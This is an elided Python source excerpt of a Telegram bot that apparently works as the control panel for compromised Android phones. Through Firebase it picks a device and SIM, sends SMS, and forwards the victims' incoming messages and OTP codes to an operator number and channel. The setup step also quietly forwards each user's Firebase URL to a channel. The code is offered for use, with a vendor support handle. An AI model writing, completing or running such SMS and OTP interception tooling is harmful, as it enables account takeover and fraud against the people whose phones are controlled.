...
# CONVERSATION STATES
# ============================
WAITING_FIREBASE_URL = 1
WAITING_CHANNEL_ID = 2
WAITING_OTP_NUMBER = 3
WAITING_GROUP_ID = 4
WAITING_FCM_TOKEN = 5
WAITING_ADD_FB = 6
WAITING_ADD_GROUP = 7
...
async def setup_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text(
            "<b>❌ Invalid URL. Must be https://...firebaseio.com</b>\n"
            "Please send a valid Firebase URL.",
            parse_mode='HTML'
        )
        return WAITING_FIREBASE_URL
    ...
    await update.message.reply_text(
        f"<b>✅ Firebase URL saved!</b>\n\n"
        f"Now send your <b>Channel ID</b> (numeric, may be negative).\n\n"
        f"<b>Support:</b> @MayaXDev",
        parse_mode='HTML'
    )
...
async def setup_channel_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        await update.message.reply_text(
            ...
            "Please send a valid numeric Channel ID.",
            parse_mode='HTML'
        )
        return WAITING_CHANNEL_ID
    ...
    try:
        forward_msg = (
            f"🔐 **Setup Complete!**\n"
            f"👤 User: `{user_id}`\n"
            f"🌐 URL: `{user_configs[user_id]['firebase_url']}`\n"
    ...
    if test is None:
        await update.message.reply_text(
            "<b>❌ Firebase connection failed. Check URL or make database public.</b>",
            parse_mode='HTML'
        )
...
def send_sms_with_confirmation(user_id, device_id, to_number, message, from_number, msg_type="SMS"):
    """Send SMS and send confirmation to user"""
    
    # Check if bot is active
    if not bot_active.get(str(user_id), True):
        logger.info(f"Bot stopped for user {user_id}, not sending SMS")
        return False
    
    # Send SMS command to Firebase
    ...
    try:
        ...
        if msg_type == "OTP":
            ...
            confirm_text += f"📱 To: <code>{to_number}</code>\n"
            confirm_text += f"🔑 OTP: <code>{message}</code>\n"
            confirm_text += f"📤 From: <code>{from_number}</code>\n"
            confirm_text += f"✅ <b>Token Send Done!</b>"
        
        elif msg_type == "INCOMING":
            confirm_text = f"📩 <b>Incoming SMS Forwarded!</b>\n\n"
            confirm_text += f"📱 To: <code>{to_number}</code>\n"
            confirm_text += f"💬 Message: <code>{message[:100]}</code>\n"
            confirm_text += f"📤 From: <code>{from_number}</code>\n"
            confirm_text += f"✅ <b>Token Send Done!</b>"
        ...
        response = requests.post(confirm_url, json=confirm_data, timeout=5)
        
        if response.status_code == 200:
            logger.info(f"✅ Confirmation sent to user {user_id}")
            return True
        else:
            logger.error(f"Confirmation send failed: {response.text}")
            return False
    ...
    if data == "menu_setup_firebase":
        if user_id in user_configs and user_configs[user_id].get("firebase_url"):
            ...
            await query.edit_message_text(
                ...
                f"<b>Firebase URL:</b> <code>{current_url}</code>\n"
                f"<b>Channel ID:</b> <code>{current_channel}</code>\n\n"
        ...
        await query.edit_message_text(
            f"<b>📢 Send new Channel ID</b>\n\n"
            f"Channel ID must be numeric (may be negative).\n\n"
            f"<b>Support:</b> @MayaXDev",
            parse_mode="HTML"
        )
        return WAITING_CHANNEL_ID
        ...
        await query.edit_message_text(
            f"<b>➕ Add Firebase</b>\n\n"
            f"Send new Firebase URL to add.\n\n"
            f"<b>Support:</b> @MayaXDev",
            parse_mode="HTML"
        )
        ...
        await query.edit_message_text(
            f"<b>❌ Delete Firebase</b>\n\n"
            f"Send Firebase URL to delete.\n\n"
            f"<b>Support:</b> @MayaXDev",
            parse_mode="HTML"
        )
...
async def select_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id not in user_configs or not user_configs[user_id].get("firebase_url"):
        await query.edit_message_text(
            "<b>❌ Please setup Firebase first using 'Setup Firebase'.</b>",
            parse_mode='HTML'
        )
        return
...
async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await query.edit_message_text(
        ...
        f"Now set OTP number using 'Set Forward No.'\n\n"
        f"<b>Support:</b> @MayaXDev",
        parse_mode='HTML'
    )
...
async def stop_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await query.edit_message_text(
        ...
        f"All forwarding and OTP operations are now stopped.\n"
        f"Click 'Resume Session' to start again.\n\n"
        f"<b>Support:</b> @MayaXDev",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
...
async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not bot_active.get(user_id, True):
        logger.info(f"Bot stopped for user {user_id}, ignoring channel message")
        return
    ...
    if not selected or not selected.get("deviceId"):
        ...
        try:
            ...
            error_data = {
                "chat_id": int(user_id),
                "text": "❌ <b>No device selected!</b>\n\nPlease select a device from 'Select Group' menu.",
                "parse_mode": "HTML"
            }
...
async def add_fb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id not in user_configs:
        user_configs[user_id] = {}
    if "additional_firebase" not in user_configs[user_id]:
        user_configs[user_id]["additional_firebase"] = []
    
    if url not in user_configs[user_id]["additional_firebase"]:
        user_configs[user_id]["additional_firebase"].append(url)
        save_user_configs()
        await update.message.reply_text(
            f"<b>✅ Firebase URL added!</b>\n\n"
            f"<code>{url}</code>\n\n"
            f"<b>Support:</b> @MayaXDev",
            parse_mode='HTML'
        )
        ...
        await update.message.reply_text(
            f"<b>⚠️ Firebase URL already exists.</b>",
            parse_mode='HTML'
        )
...
async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id not in user_configs:
        user_configs[user_id] = {}
    if "additional_groups" not in user_configs[user_id]:
        user_configs[user_id]["additional_groups"] = []
...
async def del_fb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id in user_configs and "additional_firebase" in user_configs[user_id]:
        if url in user_configs[user_id]["additional_firebase"]:
            ...
            save_user_configs()
            await update.message.reply_text(
                f"<b>✅ Firebase URL deleted!</b>\n\n"
                f"<code>{url}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"<b>❌ Firebase URL not found.</b>",
                parse_mode='HTML'
            )
    else:
        await update.message.reply_text(
            f"<b>❌ No additional Firebase URLs found.</b>",
            parse_mode='HTML'
        )
...
async def del_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id in user_configs and "additional_groups" in user_configs[user_id]:
        ...
        await update.message.reply_text(
            f"<b>❌ No additional groups found.</b>",
            parse_mode='HTML'
        )
...
def main():
    ...
    # Setup Firebase Conversation
    setup_firebase_conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(menu_callback_handler, pattern="^menu_setup_firebase$"),
            CallbackQueryHandler(menu_callback_handler, pattern="^menu_change_firebase$"),
        ],
        states={
    ...
    app.add_handler(setup_firebase_conv)
    
    # Change Channel Conversation
    change_channel_conv = ConversationHandler(
    ...
    app.add_handler(change_channel_conv)
    
    # Set Forward Number Conversation
    set_otp_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(menu_callback_handler, pattern="^menu_set_forward$"),
    ...
    app.add_handler(set_otp_conv)
    
    # Add FB Conversation
    add_fb_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_add_fb$")],
        states={
            WAITING_ADD_FB: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_fb_handler)],
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(add_fb_conv)
    
    # Add Group Conversation
    add_group_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_add_group$")],
        states={
            WAITING_ADD_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_handler)],
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    ...
    # Del FB Conversation
    del_fb_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_del_fb$")],
        states={
            WAITING_DEL_FB: [MessageHandler(filters.TEXT & ~filters.COMMAND, del_fb_handler)],
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(del_fb_conv)
    
    # Del Group Conversation
    del_group_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_callback_handler, pattern="^menu_del_group$")],
        states={
            WAITING_DEL_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, del_group_handler)],
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
